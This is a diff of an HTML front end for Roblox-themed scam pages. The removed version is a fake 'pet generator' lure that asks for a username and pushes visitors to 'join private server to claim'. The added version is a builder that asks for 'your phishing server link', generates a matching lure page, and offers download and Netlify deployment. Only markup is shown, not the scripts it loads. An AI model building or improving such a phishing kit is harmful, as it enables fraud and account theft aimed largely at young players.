@@ -1,61 +1,36 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Roblox Pet Generator</title>
-  <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Custom Pet Generator Creator</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div class="wrap">
-    <header class="hero">
-      <h1>Roblox Pet Generator</h1>
-      <p class="sub">Generate a rare pet and claim it in our private server.</p>
-    </header>
+  <div class="container">
+    <h1>Custom Pet Generator Creator</h1>
 
-    <main class="card">
-      <form id="lookupForm" class="lookup">
-        <label for="username">Enter Roblox username</label>
-        <div class="row">
-          <input id="username" name="username" type="text" placeholder="e.g. Builderman" required />
-          <button type="submit" class="btn">Find</button>
-        </div>
-        <p id="hint" class="hint">We’ll show the profile and then you can generate your pet.</p>
-      </form>
+    <div class="box">
+      <label for="genName">Enter your generator name</label>
+      <input type="text" id="genName" placeholder="MyPetGen" />
+      <label for="serverLink">Enter your phishing server link</label>
+      <input type="text" id="serverLink" placeholder="https://roblox.com/..." />
+      <button id="generatePageBtn">Generate Custom Generator</button>
+    </div>
 
-      <section id="profile" class="profile hidden">
-        <div class="avatar-wrap">
-          <img id="avatar" class="avatar" alt="Avatar" />
-        </div>
-        <div class="who">
-          <h2 id="displayName">—</h2>
-          <p id="nameLine">@<span id="name">—</span></p>
-        </div>
-      </section>
+    <div class="box" id="previewBox" style="display:none;">
+      <h3>Preview</h3>
+      <iframe id="previewFrame" width="100%" height="400px"></iframe>
+      <button id="downloadBtn">Download Files</button>
+      <button id="deployBtn">Deploy to Netlify</button>
+      <p class="deployMsg">
+        After downloading, deploy these files to <strong>Netlify</strong> to get your own <em>.netlify.app</em> domain!
+      </p>
+    </div>
 
-      <section id="generator" class="generator hidden">
-        <button id="genBtn" class="btn primary">🎲 Generate Pet</button>
-        <div id="petCard" class="pet-card hidden">
-          <div class="pet-icon" id="petIcon">✨</div>
-          <div class="pet-info">
-            <h3 id="petName">—</h3>
-            <p class="tag">Category: Rare+</p>
-          </div>
-        </div>
-        <div id="claim" class="claim hidden">
-          <p>Join private server to claim your pet:</p>
-          <a id="joinLink" target="_blank" rel="noopener" class="btn link">Join</a>
-        </div>
-      </section>
-
-      <p id="error" class="error hidden"></p>
-    </main>
-
-    <footer class="foot">
-      <small>Not affiliated with Roblox. For fun only.</small>
-    </footer>
+    <p class="footer">Made by @vyxlez.v2</p>
   </div>
 
-  <script src="app.js"></script>
+  <script src="script.js"></script>
 </body>
 </html>
